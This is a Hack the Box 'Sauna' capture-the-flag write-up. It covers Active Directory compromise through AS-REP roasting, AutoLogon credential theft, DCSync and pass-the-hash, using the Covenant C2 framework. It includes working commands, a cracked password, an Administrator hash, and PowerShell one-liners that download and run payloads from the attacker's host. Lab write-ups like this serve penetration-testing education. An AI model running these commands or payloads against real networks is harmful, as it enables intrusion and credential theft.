# :game_die: Medium

> **Original Source:** [Medium](https://infosecwriteups.com/hack-the-box-sauna-write-up-w-covenant-c2-c2d71141c90b)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Hack the Box — Sauna Write-up(w/ Covenant C2)


*[https://www.hackthebox.eu/home/machines/profile/229](https://www.hackthebox.eu/home/machines/profile/229)*


Sauna is an Easy-difficulty machine from Hack the Box created by [egotisticalSW](https://www.hackthebox.eu/home/users/profile/94858). I felt that this box is realistic as it requires you to craft potential usernames based from their public website. I also decided to show a C2 framework, in which I chose [Covenant,](https://github.com/cobbr/Covenant) which is also the same C2 I used in the Offshore labs from Hack the Box.

### To summarize the steps taken to solve the box:


**Initial foothold:**


- Generate potential usernames through common conventions used

- Identify user vulnerable to AS-REP roasting

- User is part of `Remote Management Users`, login using `WinRM`


**Fsmith → svc_loanmgr**


- Enumerate and identify credentials left in `Windows AutoLogon` registry


**svc_loanmgr →Administrator**


- User has `GetChanges-All` rights to the domain

- DCSync

## Scanning:


I first run `masscan` to quickly identify open ports:


```
sudo masscan -p1-65535,U:1-65535 10.10.10.175 --rate=1000 -e tun0
```


Based on the open ports such as 53,389,636, I can safely assume that this box is a Windows Server functioning as a Domain Controller. I then proceed on running a default `nmap` scan:


```
sudo nmap -sV -sC -oA nmap/initial 10.10.10.175 -vv -n
```


Nothing that interesting returns aside that there port 80 is `open`. The scan also gives me that the domain is `EGOTISTICAL-BANK`. I then decided to enumerate some common Windows protocols first.

### Windows RPC — Port 135


I tried to establish a NULL session using rpcclient. This doesn’t work anymore in modern Windows systems but you’ll never know if it allows you to enumerate information about the host or domain itself. I get `access denied `when trying to list domain users.


I then tried `lsaquery` to get the Domain SID. I also tried to domain names to SID using `lookupnames`, but get `access denied`.


```
rpcclient $> lsaquery
Domain Name: EGOTISTICALBANK
Domain Sid: S-1-5-21-2966785786-3096785034-1186376766
rpcclient $> lookupnames administrator
result was NT_STATUS_ACCESS_DENIED
```


I then moved on to LDAP.


**LDAP — Port 389**


LDAP can be enumerate in a lot of ways. I can use `ldapsearch` which is usually available in most Linux boxes, or use nmap scripts specific for LDAP. I used `ldapsearch` and tried to bind as an anonymous user, specifiying the base as scope:


```
ldapsearch -x -h 10.10.10.175 -s base
```


I wasn’t able to get a lot, I also snipped the output for brevity. Some useful information from the output mentions that the `domainFunctionality`, `forestFunctionality`, and `domainControllerFunctionality` is 7.


```
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
```


### Port 445 — SMB


To enumerate SMB, I used `smbclient,` listing the shares using the `-L` flag. I find that I can authenticate anonymously, but can’t list any shares.


Finding nothing that interesting, I proceeded to enumerate `HTTP`.

### HTTP — Port 80


Viewing the webpage, it seems that the company is a bank.


Scrolling further down, I find pictures of clients and mentions that `“… I can’t even get a ticket to roast my chestnuts”` . This hints that I have to do something with “roasting”. In the context of Active Directory attacks, `AS-REP roast` and `Kerberosting` comes into mind.


*index.html*


I then ran a directory brute force on the page using dirsearch, specifiying to check for files with `aspx`,`html`, and `txt` extensions. I found nothing interesting.


I then browsed the websites and found` /about.html` which mentions some posts by `Admin`.

*/about.html*


I also found `/contact.html` which has a contact form. I tried sending random data and intercepted it using Burp:


*/contact.html*


Checking the request through Burp:


Sending the request results to `error 405` . The means `POST` method is not allowed, so this contact form is a dead end.


Checking other pages, I found `/about.html` . It mentions a few users that are a part of their team and a rant. It also gives us a few names which we can try to generate usernames from.


Checking the other content from the web page, there seems to be nothing useful and are just placeholders.

### AS-REP roasting


Knowing that I have a few names, I can try to generate a wordlist of potential username conventions. Since there are no other services which we can authenticate or login with, this most likely means that I need to authenticate to AD. Since there are a few hints on “roasting”, I decided to try out AS-REP roasting. AS-REP roasting is an attack on Kerberos where you can request data that is encrypted by the user whose PREAUTH is not enabled. I explained more of the concept of that on my [Forest write-up](https://medium.com/bugbountywriteup/hackthebox-forest-5a11553de1). So the names I have are the following:


```
fergus smith
hugo bear
steven kerb
shaun coins
bowie taylor
sophie driver
```


One common way of deriving usernames from full names is separating the firstname and lastname with a “dot”, like this:


```
fergus.smith
hugo.bear
steven.kerb
shaun.coins
bowie.taylor
sophie.driver
```


Another common way is using the first letter of the first name followed by a dot, then the last name, like this:


```
f.smith
h.bear
s.kerb
s.coins
b.taylor
s.driver
```


Another way is to just use the first letter of the first name appended by the last name, like this:


```
fsmith
hbear
skerb
scoins
btaylor
sdriver
```


Having three possible pattern of usernames, I created a single wordlist:


```
fergus.smith
hugo.bear
steven.kerb
shaun.coins
bowie.taylor
sophie.driver
f.smith
h.bear
s.kerb
s.coins
b.taylor
s.driver
fsmith
hbear
skerb
scoins
btaylor
sdriver
```


I then proceeded to check for users that are vulnerable to AS-REP roasting using impacket’s GetNPUsers:


```
/opt/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users1.txt -dc-ip 10.10.10.175
```


This results to the user `fsmith` responding with an AS-REP, which we can crack using hashcat later on. Even if this technique doesn’t return a user that is vulnerable, this can help you identify valid domain users. Notice that when the error is `KDC_ERR_C_PRINCIPAL_UNKNOWN`, that user is not a valid domain user. This can be verified by testing using the `Administrator` username, which I am sure exists:


```
/opt/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/Administrator -dc-ip 10.10.10.175
```


The response is UF_DONT_REQUIRE_PREAUTH set, which means that PREAUTH is enabled for that user. Moving on, I place the returned AS-REP on a text file and will crack it using `hashcat`:


```
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force
```


The password for the user `fsmith` is `Thestrokes23` .


I then use crackmapexec(cme) to check if the credentials are valid, and also check the domain’s password policy which is not that useful anymore in this CTF context, but in a real pentest, this gives you valuable information such regarding account lockouts and minimum password length enforced in the domain.


```
/opt/cme smb 10.10.10.175 -d EGOTISTICAL-BANK -u fsmith -p Thestrokes23 --pass-pol
```


I also checked the shares available using cme:


I also checked it using smbmap:


```
/opt/smbmap/smbmap.py -H 10.10.10.175 -u fsmith -p Thestrokes23
```


Why I did it twice? Because I wanted to show how you can achive one thing using different tools. So when either one of cme or smbmap or smbclient(I used it above) fails, there are still options that I can use to achieve my goal.


## Get sif0’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Before checking out those shares, I proceeded to enumerate LDAP first since I can now authenticate to the domain:


```
ldapdomaindump 10.10.10.175 -u "egotistical-bank\fsmith" -p Thestrokes23 -o ldapdomaindump/ --no-json --no-grep
```


Checking the html output, it shows the list of domain users and their memberships. It is notable that `fsmith` is a part of `Remote Management Users`, which means that user most likely can do `PSRemoting` on the box. There is also another user `svc_loanmgr`, which is not mentioned in the web page(of course because it’s a service account).


From the output of ldapdomaindump, you can see that `DONT_REQ_PREAUTH` is set for `fsmith`, leading to that user being vulnerable to `AS-REP` roasting.


There are various ways I can interact with `PSRemoting` which runs on port `5985` or` 5986(SSL)` . Since I’m using Kali, the go-to is `Evil-WinRM`. I now have an initial foothold on the box.


I then list files and directories recursively with a depth of 3 under the C:\users directory. `Gci` is a shortcut to `Get-ChildItem` in PowerShell. It’s basically `dir` on Windows CMD or `ls` in Bash.


```
*Evil-WinRM* PS C:\Users\FSmith\Documents> gci -path c:\users\ -recurse -depth 3
```


I find users on the box:


I also find the `user.txt` which is under `fsmith’s` Desktop:


### fsmith → svc_loanmgr


To enumerate how I can escalate privileges, I used [Seatbelt](https://github.com/GhostPack/Seatbelt), which is a tool to check common Windows configurations. I put that file on my Python http server and download it on the box.


```
*Evil-WinRM* PS C:\Users\FSmith\Documents> iwr -uri [http://10.10.14.3/s.exe](http://10.10.14.3/s.exe) -o ..\music\s.exe
```


I run `Seatbelt` with `-group=all` options, cause I want the blue team to find me LOL. Note that this is very noisy, so in a real engagement, don’t run `-group=all` option.


One notable finding are the credentials left on WindowsAutoLogon. This is usually a misconfiguration because of the convenience it gives. You can read more about it [here](https://support.microsoft.com/en-ph/help/324737/how-to-turn-on-automatic-logon-in-windows).


Microsoft mentions that this is a security risk:

>

If you set a computer for autologon, anyone who can physically obtain access to the computer can gain access to all the computer’s contents, including any networks it is connected to. Additionally, when autologon is turned on, the password is stored in the registry in plain text. The specific registry key that stores this value can be remotely read by the Authenticated Users group. This setting is recommended only for cases in which the computer is physically secured and steps have been taken to make sure that untrusted users cannot remotely access the registry.


I then log in to the box as `svc_loanmgr` . I then proceeded to loading [Powerview](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) on the box.


```
iex(new-object net.webclient).downloadString('[http://10.10.14.3:9000/1.ps1'](http://10.10.14.3:9000/1.ps1'))
```


I also checked if the script was loaded properly by running `Get-DomainUser` against `svc_loanmgr`:


```
get-domainuser -identity svc_loanmgr
```


When I initially solved this box, I used `Bloodhound`, which will clearly show you that the user `svc_loanmgr` can `DCSync` and get the domain hashes. But for the purpose of this write-up and to add flavor, I’ll be using `Covenant`, a C2 framework written in `C#`(this means its implants only works on Windows hosts) as there are few write-ups on how to set it up, and I’ll also be demonstrating its basic functionalities. If you are in a real environment where there are hundreds to thousands of PCs, you can’t be catching your shells using just netcat or Metasploit because as you get deeper into the environment, shells and sessions gets harder to manage. Hence the use of a C2 framework.

### Using Covenant:


To use Covenant, I need to clone it first from the Github [repo](https://github.com/cobbr/Covenant). The steps to install it can be found [here](https://github.com/cobbr/Covenant/wiki/Installation-And-Startup). I’ll be doing option 1. Cloning the repo:


```
git clone --recurse-submodules [https://github.com/cobbr/Covenant](https://github.com/cobbr/Covenant)
```


I also need to download dotnet. Note, download the specific version of dotnet mentioned in the repo.


After extracting its contents, I make it executable, and build Covenant using `dotnet build` . If everything goes well, you should see build succeeded. Then I `dotnet run `while on the Covenant/Covenant directory to launch Covenant. By default, it listens on port 7443. It is also ideal to run it on elevated privileges so you can use common TCP ports for your listeners.


Visiting https://<yourIP>:7443, it prompts a warning because Covenant uses a self-signed certificate, which is fine:


After accepting, it is needed to register an initial user. You can add more users later on.


Covenant’s dashboard is simple. It shows you your `Grunts`, `Listeners`, and `Taskings`. A grunt is your current `“implant”` running on a victim machine. `Listeners` are where the implant calls back to, and the `Taskings` are the commands or modules assigned to your `Grunts`. I suggest you read the documentation on the Github repo for more details.


The first step is to create a listener:


Pressing create, I can give my listener a `name` which is useful for identifying which listener is used for what. I also set the connect address to my Hack the Box IP:


Now, I can see that there is a listener called Sauna, which is still `Uninitialized`. This is because I ran Covenant as a `non-elevated user`, which prevented Covenant to use port 80(a common port). If I ran Covenant as an elevated user or chose a higher port, the status would be `Active`.


Checking the terminal where I ran Covenant, I see “permission denied”, due to the reasons mentioned above.


I did that intentionally to demonstrate possible issues when you are setting up Covenant. I re-ran Covenant this time as an elevated user, and created a listener on port 9000(in a real engagement, use a common port such as 53,80, or 443. But make sure you setup a trusted cert for HTTPs). See that the status is `Active`.


Now that I have a listener, the next step is to choose a `Launcher`. Launchers is what I’ll use to launch a Grunt. This can be done in various ways, listed below:


For example, I can use a Binary `Launcher` to start-off a `Grunt`.


Choose generate to create a Launcher:


There are various ways to put the Binary Launcher on the victim box. I can either download the binary and transfer it through HTTP or SMB or whatever. I can also rename the file:


I can also use the Listener created to host the file.


Or even check the code used, which can be handy in building your own `Grunts` for evasion purposes.


I can also start a `Grunt` using a PowerShell `Launcher:`


Pressing generate, it creates two PowerShell one-liners, one of which is an encoded. I can just paste this on a session I have on the victim box.


I used the PowerShell launcher. Now on my Covenant dashboard, I get a notification that a Grunt has been activated:


Checking the properties of the `Grunt`, it shows useful information such as the domain name, current user, hostname, IP address, Windows version, and time details.


After selecting a Grunt, there are various tabs such as Info, Interact, Task, and Taskings. Info is what I showed above.


Interact is a terminal which can be used to interact with the Grunt. For example, using the `ShellCmd` task, I can run `whoami`:


Task is a “GUI” version of Interact:

*Task*


And finally Taskings(populated by the task I ran below) which lists all the tasks assigned to this Grunt:


*Taskings tab*


I can then give the Grunt a task, which you have many options I’ll let you explore this on your own. Seatbelt is also available here, so I run the same command which is “-group=all”.

*Task tab*


I can then select a specific task under Taskings, and view its status or output. This is also reflected in the Interact tab.


I then launch another `Grunt`, this time on my `WinRM` session as s`vc_loanmgr`. I get a callback, and I can see I have two `Grunts`:


One strength of using a C2 is I can import a PowerShell script through the Grunt. I can assign a task called “PowerShellImport”. In this case, I’ll be importing Powerview.


I can also host any file, in this case Powerview with a file name of 1.ps1.


After pressing create, it generated a PowerShell one-liner to load the script in memory using the famous iex(Invoke-Expression).


Since I already knew previously that `svc_loanmgr` has `DCSync` rights, I can then assign a task for my Grunt to use DCSync, which uses the Mimikatz binary. No need to drop Mimikatz binary on the system or load Invoke-Mimikatz!


I then see the Administrator hash:


Another cool feture of Covenant is it can store credentials gathered using Grunts and can list also indicators that can be helpful in a real engagement.


Now that I have an Administrator’s hash, I can do pass-the-hash. I used cme to execute a PowerShell command, which is an encoded PowerShell launcher:


```
sudo /opt/cme smb 10.10.10.175 -d egotistical-bank.local -u administrator -H 'd9485863c1e9e05851aa40cbb4ab9dff' -X "powershell -Sta -Nop -Window Hidden -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMwA6ADkAMAAwADAALwBhAC4AcABzADEAJwApAA=="
```


I then get a notification that a `Grunt` is activated:


Checking my `Grunts`:


I then interact with the Grunt that runs as Administrator, and read the flags from there.


This concludes my write-up. I hope you learned something new! Thanks for reading! 🍺

---

*Originally published on [Medium](https://infosecwriteups.com/hack-the-box-sauna-write-up-w-covenant-c2-c2d71141c90b). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
